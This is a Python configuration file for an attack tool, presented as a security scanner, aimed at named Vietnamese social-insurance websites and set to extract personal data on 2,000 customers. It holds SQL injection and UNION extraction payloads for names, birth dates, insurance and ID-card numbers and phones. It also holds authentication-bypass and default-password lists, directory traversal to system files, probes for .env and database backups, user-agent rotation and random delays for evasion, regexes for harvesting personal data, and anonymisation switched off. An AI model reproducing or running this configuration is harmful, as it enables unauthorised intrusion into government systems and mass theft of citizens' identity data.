#!/usr/bin/env python3
"""
Security Scanner Configuration
=============================

Cấu hình chi tiết cho việc quét bảo mật và trích xuất dữ liệu BHXH
"""

# Target Configuration
TARGET_CONFIG = {
    "base_url": "http://bhxh.vn",  # URL chính cần quét
    "secondary_urls": [
        "http://baohiemxahoi.gov.vn",
        "http://bhxh.gov.vn",
        "http://portal.bhxh.vn"
    ],
    "target_customer_count": 2000,  # Số lượng thông tin khách hàng cần trích xuất
    "max_concurrent_requests": 10,   # Số request đồng thời tối đa
    "request_delay": (0.1, 1.5),   # Khoảng delay giữa các request (min, max)
    "timeout": 15                   # Timeout cho mỗi request
}

# API Endpoints to scan
API_ENDPOINTS = [
    # Customer APIs
    "/api/customers",
    "/api/customer/{id}",
    "/api/users",
    "/api/user/{id}",
    "/api/search",
    "/api/lookup",
    
    # BHXH specific endpoints
    "/api/bhxh/search",
    "/api/bhxh/customer/{id}",
    "/api/bhxh/lookup/{bhxh_number}",
    "/api/insurance/customer",
    "/api/social-security/lookup",
    
    # Portal endpoints
    "/portal/api/customer",
    "/portal/customer/search",
    "/services/customer/lookup",
    "/rest/customer/get",
    
    # Admin endpoints
    "/admin/api/users",
    "/admin/customers",
    "/admin/user/list",
    "/dashboard/api/customers",
    
    # Internal APIs
    "/internal/api/users",
    "/internal/customer/data",
    "/backend/customer",
    "/system/users",
    
    # Versioned APIs
    "/v1/customers",
    "/v1/users", 
    "/v2/customer",
    "/v2/users",
    "/api/v1/customer",
    "/api/v2/users"
]

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    # Basic SQL injection
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "admin'/*",
    
    # Union-based payloads
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT ho_ten,ngay_sinh,so_bhxh FROM khach_hang--",
    
    # Boolean-based blind
    "' AND (SELECT COUNT(*) FROM users) > 0--",
    "' AND (SELECT COUNT(*) FROM customer) > 0--",
    "' AND (SELECT COUNT(*) FROM khach_hang) > 0--",
    
    # Time-based blind
    "'; WAITFOR DELAY '00:00:05'--",
    "' AND (SELECT SLEEP(5))--",
    "'; SELECT pg_sleep(5)--",
    
    # Database-specific payloads
    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",  # MySQL
    "' AND (SELECT version()) LIKE '%PostgreSQL%'--",  # PostgreSQL
    "'; EXEC xp_cmdshell('dir')--",  # SQL Server
    
    # Data extraction payloads
    "' UNION SELECT ho_ten,ngay_sinh,so_bhxh,so_cmnd,so_dien_thoai,NULL,NULL,NULL FROM khach_hang LIMIT 100--",
    "' UNION SELECT customer_name,birth_date,insurance_number,id_number,phone,NULL,NULL,NULL FROM customers LIMIT 100--",
    "' UNION SELECT name,dob,bhxh_code,cccd,mobile,NULL,NULL,NULL FROM user_info LIMIT 100--"
]

# Parameters to test for SQL injection
SQL_INJECTION_PARAMETERS = [
    "id", "search", "query", "username", "customer_id", "bhxh_id",
    "user_id", "name", "phone", "cmnd", "cccd", "insurance_number",
    "lookup", "find", "filter", "sort", "order", "limit", "offset",
    "ma_kh", "so_bhxh", "so_cmnd", "so_cccd", "ho_ten", "ngay_sinh"
]

# Authentication Bypass Payloads
AUTH_BYPASS_PAYLOADS = [
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "admin'--", "password": "anything"},
    {"username": "admin'/*", "password": "anything"},
    {"username": "' OR 1=1--", "password": "anything"},
    {"username": "admin", "password": "admin"},
    {"username": "administrator", "password": "administrator"},
    {"username": "root", "password": "root"},
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "admin123"}
]

# Directory Traversal Payloads
DIRECTORY_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....\\....\\windows\\win.ini",
    "/etc/passwd%00",
    "\\windows\\system32\\drivers\\etc\\hosts%00"
]

# Sensitive Files to Check
SENSITIVE_FILES = [
    # Configuration files
    "/config.php", "/configuration.php", "/config.inc.php",
    "/web.config", "/app.config", "/settings.ini",
    "/.env", "/.env.local", "/.env.production",
    
    # Database files
    "/backup.sql", "/database.sql", "/db.sql",
    "/customer.sql", "/users.sql", "/bhxh.sql",
    "/dump.sql", "/export.sql", "/data.sql",
    
    # Backup files
    "/backup/customer.sql", "/backup/users.sql",
    "/db/customer_data.sql", "/data/export.sql",
    "/backup.tar.gz", "/backup.zip",
    
    # Log files
    "/log/error.log", "/logs/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/error.log",
    
    # System files
    "/robots.txt", "/sitemap.xml",
    "/.htaccess", "/.htpasswd",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    
    # Git repositories
    "/.git/config", "/.git/HEAD",
    "/.git/logs/HEAD", "/.svn/entries",
    
    # PHP info and test files
    "/phpinfo.php", "/info.php", "/test.php",
    "/admin.php", "/login.php", "/index.php~",
    
    # CSV/Excel exports
    "/export/customer.csv", "/data/customer_export.xlsx",
    "/reports/customer_data.csv", "/backup/customer.xlsx"
]

# User Agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]

# Vietnamese customer data patterns
VIETNAMESE_DATA_PATTERNS = {
    "names": [
        r'(?:tên|name|họ\s*tên|fullname|customer_name)["\s:=]+([A-ZÀ-Ỹ][a-zà-ỹ]+(?:\s+[A-ZÀ-Ỹ][a-zà-ỹ]+)*)',
        r'ho_ten["\s:=]+([A-ZÀ-Ỹ][a-zà-ỹ]+(?:\s+[A-ZÀ-Ỹ][a-zà-ỹ]+)*)',
        r'"full_name":\s*"([^"]+)"',
        r'"customerName":\s*"([^"]+)"'
    ],
    "birth_dates": [
        r'(?:ngày\s*sinh|birth|dob|birth_date)["\s:=]+(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{4})',
        r'ngay_sinh["\s:=]+(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{4})',
        r'"birthDate":\s*"([^"]+)"',
        r'"dateOfBirth":\s*"([^"]+)"'
    ],
    "bhxh_numbers": [
        r'(?:bhxh|bảo\s*hiểm|insurance)["\s:=]*([A-Z0-9]{8,15})',
        r'so_bhxh["\s:=]*([A-Z0-9]{8,15})',
        r'"bhxhNumber":\s*"([^"]+)"',
        r'"insuranceNumber":\s*"([^"]+)"'
    ],
    "id_numbers": [
        r'(?:cmnd|cccd|id_number|identity)["\s:=]*(\d{9,12})',
        r'so_cmnd["\s:=]*(\d{9,12})',
        r'so_cccd["\s:=]*(\d{9,12})',
        r'"idNumber":\s*"([^"]+)"',
        r'"identityNumber":\s*"([^"]+)"'
    ],
    "phone_numbers": [
        r'(?:điện\s*thoại|phone|mobile|contact)["\s:=]*(\+?84?[0-9]{9,11})',
        r'so_dien_thoai["\s:=]*(\+?84?[0-9]{9,11})',
        r'"phone":\s*"([^"]+)"',
        r'"phoneNumber":\s*"([^"]+)"'
    ]
}

# Security Headers to check
SECURITY_HEADERS = [
    'X-Frame-Options',
    'X-XSS-Protection', 
    'X-Content-Type-Options',
    'Strict-Transport-Security',
    'Content-Security-Policy',
    'X-Permitted-Cross-Domain-Policies',
    'Referrer-Policy',
    'Feature-Policy',
    'Access-Control-Allow-Origin'
]

# Error patterns that indicate vulnerabilities
ERROR_PATTERNS = {
    "sql_injection": [
        r"sql syntax.*?near.*?line \d+",
        r"mysql_fetch",
        r"ora-\d+",
        r"microsoft ole db",
        r"unclosed quotation mark",
        r"syntax error.*?mysql",
        r"sqlite_",
        r"postgresql.*?error",
        r"warning: mysql",
        r"valid mysql result"
    ],
    "path_traversal": [
        r"root:",
        r"daemon:",
        r"localhost",
        r"windows",
        r"\[font\]",
        r"for 16-bit app support"
    ],
    "php_errors": [
        r"warning:.*?php",
        r"fatal error:.*?php",
        r"parse error:.*?php",
        r"notice:.*?php"
    ]
}

# Database table names to try
DATABASE_TABLES = [
    # Vietnamese tables
    "khach_hang", "nguoi_dung", "user_info", "thong_tin_kh",
    "bao_hiem", "bhxh_info", "customer_bhxh", "so_bhxh",
    
    # English tables  
    "customers", "users", "customer_data", "user_data",
    "profiles", "accounts", "members", "clients",
    "insurance", "social_security", "customer_info",
    
    # Common system tables
    "admin", "administrators", "login", "auth",
    "session", "config", "settings"
]

# Report Configuration
REPORT_CONFIG = {
    "excel_sheets": [
        "Executive Summary",
        "Customer Data", 
        "Vulnerabilities",
        "Security Findings",
        "SQL Injection Details",
        "Authentication Issues",
        "Data Exposure Points",
        "Recommendations"
    ],
    "max_records_per_sheet": 10000,
    "include_raw_responses": False,  # Include raw HTTP responses
    "include_screenshots": False,    # Include screenshots (if GUI)
    "anonymize_data": False,         # Anonymize sensitive data in reports
    "compress_reports": True         # Compress final reports
}

# Scanning Phases Configuration
SCANNING_PHASES = {
    "phase1_reconnaissance": {
        "enabled": True,
        "max_endpoints": 50,
        "timeout": 10,
        "follow_redirects": True
    },
    "phase2_vulnerability_scanning": {
        "enabled": True,
        "sql_injection": True,
        "auth_bypass": True,
        "directory_traversal": True,
        "information_disclosure": True,
        "session_vulnerabilities": True,
        "api_vulnerabilities": True,
        "access_control": True
    },
    "phase3_data_extraction": {
        "enabled": True,
        "api_enumeration": True,
        "database_exposure": True,
        "backup_files": True,
        "directory_traversal": True,
        "session_hijacking": False  # More aggressive
    }
}

# Risk Assessment Thresholds
RISK_THRESHOLDS = {
    "critical": {
        "sql_injection": 1,
        "customer_data_exposed": 100,
        "database_accessible": 1
    },
    "high": {
        "auth_bypass": 1,
        "sensitive_files": 3,
        "api_exposure": 5
    },
    "medium": {
        "information_disclosure": 5,
        "missing_security_headers": 5
    }
}

# Output Configuration
OUTPUT_CONFIG = {
    "base_directory": "./security_assessment_results",
    "create_timestamped_folder": True,
    "export_formats": ["excel", "json", "pdf", "html"],
    "backup_raw_data": True,
    "log_level": "INFO"  # DEBUG, INFO, WARNING, ERROR
}
